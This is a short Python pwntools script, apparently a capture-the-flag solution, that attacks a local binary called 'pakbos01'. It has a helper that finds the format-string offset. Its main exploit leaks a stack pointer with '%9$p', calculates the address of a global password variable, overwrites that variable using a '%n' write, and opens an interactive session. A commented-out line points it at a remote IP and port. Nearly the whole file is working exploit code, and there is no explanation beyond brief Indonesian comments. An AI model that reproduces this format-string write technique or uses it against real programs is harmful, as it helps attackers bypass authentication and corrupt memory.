from pwn import *

p = process("./pakbos01")
# p = remote("3.0.19.78", 10001)

def offset_finder():
    for x in range (1, 100):
        p = process("./pakbos01")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendline(payload)
        p.recvuntil("password: ")
        stack_value = p.recvuntil("?")[:-1]
        print "Stack value: {}".format(stack_value)
        p.close()

def exploit():
    payload = "%9$p"
    
    p.sendline(payload)
    p.recvuntil("password: ")
    
    stack_value = p.recvuntil("?")[:-1]
    stack_value = int(stack_value, 16)

    log.info("Stack value: {}".format(hex(stack_value)))

    password_addr = stack_value + 0x201940
    log.info("Password addr: {}".format(hex(password_addr)))


    # gdb.attach(p, """
    #         pie b*0x90f 
    #         """)

    # di 64 bit, nge-overwrite global variable dengan cara
    # "%perhitungan" + "%offset+1 + "$n" + address

    payload = ''
    payload += "%{}p%7$n".format(ord('A'))
    payload += p64(password_addr)

    log.info("Payload: {}".format(payload))

    p.sendline(payload)
    p.sendline("A")

    p.interactive()

if __name__ == "__main__":
    exploit()
    # offset_finder()